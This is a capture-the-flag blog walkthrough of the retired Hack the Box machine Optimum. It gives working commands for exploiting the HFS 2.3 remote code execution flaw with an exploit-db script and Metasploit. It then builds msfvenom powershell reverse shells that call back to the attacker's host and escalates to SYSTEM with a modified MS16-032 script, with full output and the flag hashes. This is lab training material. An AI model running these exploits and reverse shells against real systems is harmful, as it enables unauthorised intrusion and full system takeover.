---
layout: post
title: "Hack the Box Optimum"
source: "https://anotsodev.me/hack-the-box-optimum/"
author:
  - "[[anotsodev]]"
date: 2017-10-28
description: "This is a write-up of the retired Optimum box on Hack the Box. First thing I did was to fire up nmap and ran this command. nmap -sV -sC -oA optimum 10.10.10.8 And got this result. Nmap scan report …"
tags:
  - "clippings"
---
This is a write-up of the retired Optimum box on Hack the Box.

First thing I did was to fire up nmap and ran this command.

```
nmap -sV -sC -oA optimum 10.10.10.8
```

And got this result.

```
Nmap scan report for 10.10.10.8
Host is up (0.42s latency).
Not shown: 999 filtered ports
PORT STATE SERVICE VERSION
80/tcp open http HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.77 seconds
```

So only port 80 was open and it was a HttpFileServer.

***HTTP File Server**, otherwise known as HFS, is a free web server specifically designed for publishing and sharing files. The complete feature set differs from other web servers; it lacks some common features, like CGI, or even* ability *to run as a Windows service, but includes, for example, counting file downloads. It is even advised against using it as an ordinary web server.  
*

*Source:* https://en.wikipedia.org/wiki/HTTP\_File\_Server

I opened the service on the web browser and it was just a dashboard of the HFS.

The version of the HFS was 2.3 so I searchploited it.

```
root@kali:~/Documents/HTB/Optimum# searchsploit hfs
------------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title | Path
 | (/usr/share/exploitdb/platforms/)
------------------------------------------------------------------------------------------------- ----------------------------------
Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service | osx/dos/29454.txt
Apple Mac OSX 10.6 - HFS FileSystem Exploit (Denial of Service) | osx/dos/12375.c
Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure | osx/local/35488.c
Apple Mac OSX xnu 1228.x - (hfs-fcntl) Kernel Privilege Escalation | osx/local/8266.txt
FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution | windows/remote/37985.py
Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service | linux/dos/28895.txt
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit) | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | windows/webapps/34852.txt
------------------------------------------------------------------------------------------------- ----------------------------------
```

So there were multiple exploits available for HFS version 2.3.

The first exploit that I used was this.

```
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py
```

I copied the exploit and named it as exploit.py on my directory. After I copied the exploit, I modified a few lines of codes and entered my IP address and local port number to listen to.

```
root@kali:~/Documents/HTB/Optimum# nano exploit.py

# changed the following lines
ip_addr = "10.10.14.116" #local IP address
local_port = "9999" # Local Port number

root@kali:~/Documents/HTB/Optimum# python exploit.py 
[.]Something went wrong..!
Usage is :[.] python exploit.py <Target IP address> <Target Port Number>
Don't forgot to change the Local IP address and Port number on the script
root@kali:~/Documents/HTB/Optimum# python exploit.py 10.10.10.8 80

# Open new Terminal Tab
root@kali:~/Documents/HTB/Optimum# nc -lvp 9999
```

After running the exploit and opened a new terminal for the netcat listener, I got an access to the shell. This means that the exploit worked, however, I was not able to do other things so I need to have a meterpreter access to run the privilege escalation suggester and use the suggested privesc exploits to have a root access on the system.

Good thing there was a metasploit module of the HFS exploit. So I fired up metasploit and used the exploit.

```
msf > search hfs

Matching Modules
================

Name Disclosure Date Rank Description
 ---- --------------- ---- -----------
 exploit/multi/http/git_client_command_exec 2014-12-18 excellent Malicious Git and Mercurial HTTP Server For CVE-2014-9390
 exploit/windows/http/rejetto_hfs_exec 2014-09-11 excellent Rejetto HttpFileServer Remote Command Execution
```
```
msf > use exploit/windows/http/rejetto_hfs_exec
msf exploit(rejetto_hfs_exec) > set RHOST 10.10.10.8
RHOST => 10.10.10.8
msf exploit(rejetto_hfs_exec) > set SRVPORT 7777
SRVPORT => 7777
msf exploit(rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.116:4444 
[*] Using URL: http://0.0.0.0:7777/YqQuLmjEaXD
[*] Local IP: http://192.168.8.102:7777/YqQuLmjEaXD
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /YqQuLmjEaXD
[*] Sending stage (179267 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.116:4444 -> 10.10.10.8:49239) at 2017-10-14 09:51:34 -0400
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\pCrVCNhk.vbs' on the target
```

Got a meterpreter session.

```
meterpreter >
meterpreter > sysinfo
Computer : OPTIMUM
OS : Windows 2012 R2 (Build 9600).
Architecture : x64
System Language : el_GR
Domain : HTB
Logged On Users : 1
Meterpreter : x86/windows
```

I needed to background first the session so that I am able to run the exploit suggester for windows.

```
meterpreter > background
[*] Backgrounding session 1...

msf exploit(rejetto_hfs_exec) > search suggester

Matching Modules
================

Name Disclosure Date Rank Description
---- --------------- ---- -----------
post/multi/recon/local_exploit_suggester normal Multi Recon Local Exploit Suggester

msf exploit(rejetto_hfs_exec) > use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > set SESSION 1
SESSION => 1
msf post(local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 37 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/ms_ndproxy: The target service is running, but could not be validated.
[*] Post module execution completed
msf post(local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf exploit(ms16_032_secondary_logon_handle_privesc) > 
msf exploit(ms16_032_secondary_logon_handle_privesc) > run
msf exploit(ms16_032_secondary_logon_handle_privesc) > set SESSION 2
[*] Started reverse TCP handler on 192.168.8.102:4444 
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\Desktop\cbOzoCyJAykO.txt...
[*] Compressing script contents...
[+] Compressed size: 3596
[*] Executing exploit script...

[+] Cleaned up C:\Users\kostas\Desktop\cbOzoCyJAykO.txt
[*] Exploit completed, but no session was created.
msf exploit(ms16_032_secondary_logon_handle_privesc) >
```

The ms16\_032\_secondary\_logon\_handle\_privesc exploit was an exploit for Windows 2012 R2 (Build 9600) but it didn’t work and there was no session created. However, there was a manual exploit script for the ms16\_032\_secondary\_logon\_handle\_privesc and I will use that exploit to have a root access on the system.

So I downloaded the exploit from exploitdb.

https://www.exploit-db.com/exploits/39719/

The exploit was a powershell script. So for the exploit to work, I needed to have an interactive powershell access on the system to run the script, so what I did was to create a reverse powershell payload using msfvenom.

```
root@kali:~/Documents/HTB/Optimum# msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.116 LPORT=5555 -f exe > shell.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1802 bytes
Final size of exe file: 8192 bytes
```

After the payload was created, I fired up metasploit on the other tab to use the handler to catch the reverse powershell.

Reverse Powershell Tab

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload payload/windows/x64/powershell_reverse_tcp
[-] The value specified for payload is not valid.
msf exploit(handler) > set payload windows/x64/powershell_reverse_tcp
payload => windows/x64/powershell_reverse_tcp
msf exploit(handler) > set LHOST 10.10.14.116
LHOST => 10.10.14.116
msf exploit(handler) > set LPORT 5555
LPORT => 5555
msf exploit(handler) > exploit -j -z
[*] Exploit running as background job 0.
msf exploit(handler) > 
[*] Started reverse SSL handler on 10.10.14.116:5555

msf exploit(handler) >
```

After creating the handler I uploaded and executed the reverse powershell.

```
meterpreter > pwd
C:\Users\kostas\Desktop
meterpreter > upload shell.exe
[*] uploading : shell.exe -> shell.exe
[*] uploaded : shell.exe -> shell.exe
meterpreter > execute -f shell.exe
```

On the Reverse Powershell Tab, I got a powershell session.

```
msf exploit(handler) > [*] Powershell session session 2 opened (10.10.14.116:5555 -> 10.10.10.8:49251) at 2017-10-14 10:22:40 -0400
```

So it’s time to modify the ms16-032 script to work.

```
# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
        $CallResult = [Advapi32]::CreateProcessWithLogonW(
            "user", "domain", "pass",
            0x00000002, "C:\Windows\System32\cmd.exe", "", #change this to your reverse shell.
            0x00000004, $null, $GetCurrentPath,
            [ref]$StartupInfo, [ref]$ProcessInfo)
```

I needed to create another reverse shell using msfvenom and change a few line of codes in the ms16-032 script to execute the reverse shell as root.

```
# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
        $CallResult = [Advapi32]::CreateProcessWithLogonW(
            "user", "domain", "pass",
            0x00000002, "C:\Users\kostas\Desktop\yourrevshell.exe", "", #changed
            0x00000004, $null, $GetCurrentPath,
            [ref]$StartupInfo, [ref]$ProcessInfo)
```

I needed to open another handler again on metasploit to catch the reverse shell and to have a root access on the system.

And after modifying the script and creating the handler, it’s time to execute the exploit using the interactive powershell.

**Reverse Powershell Tab**

```
PS C:\Users\kostas\Desktop> ./MS16-032.ps1
PS C:\Users\kostas\Desktop> Import-Module ./MS16-032.ps1
PS C:\Users\kostas\Desktop> Invoke-MS16-032
__ __ ___ ___ ___ ___ ___ ___ 
| V | _|_ | | _|___| |_ |_ |
| |_ |_| |_| . |___| | |_ | _|
|_|_|_|___|_____|___| |___|___|___|
 
[by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2172

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2168
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

PS C:\Users\kostas\Desktop>
```

And on the reverse shell handler tab, you can see that it already caught the reverse shell executed by the exploit and there it goes, I already had a root access on the system.

**Reverse Shell Tab**

```
msf exploit(handler) > 
[*] Sending stage (179267 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.116:1337 -> 10.10.10.8:50253) at 2017-10-14 12:23:26 -0400

msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 752 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

C:\Users\kostas\Desktop>more user.txt.txt
more user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73

C:\Users\kostas\Desktop>cd C:\Users
cd C:\Users

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>more root.txt
more root.txt
51ed1b36553c8461f4552c2e92b3eeed

C:\Users\Administrator\Desktop>
```

I have now the user and root hashes of the box.

---

**Subscribe for more!**

To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.

I promise I won’t be spamming your mailbox. Because no one loves spam. AMIRIGHT?

![](https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&ssl=1)